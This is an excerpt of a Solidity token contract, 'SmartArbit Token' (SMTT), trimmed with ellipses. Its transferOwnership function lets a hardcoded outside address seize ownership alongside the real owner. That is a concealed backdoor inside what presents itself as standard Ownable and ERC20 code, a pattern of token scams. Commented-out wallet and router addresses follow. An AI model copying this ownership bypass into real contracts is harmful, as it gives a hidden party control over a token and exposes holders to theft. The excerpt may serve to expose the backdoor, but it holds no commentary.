...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xDb5cc85264E05c09E0Bf968787bb9A88d01623d9));
...
contract Smartarbit is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "SMTT";
  string private _name = "SmartArbit Token";
  address public newun;

  // uint256 private constant DefaultLiquidityLockTime=0;

  // address public constant TeamWallet = 0xA071bf6daBc44Aa6412d49108f400D6F929B1Ead;
  // address private constant PancakeRouter = 0x7a1f80a8ec415D8456A1B982e673cac79E7b8758;
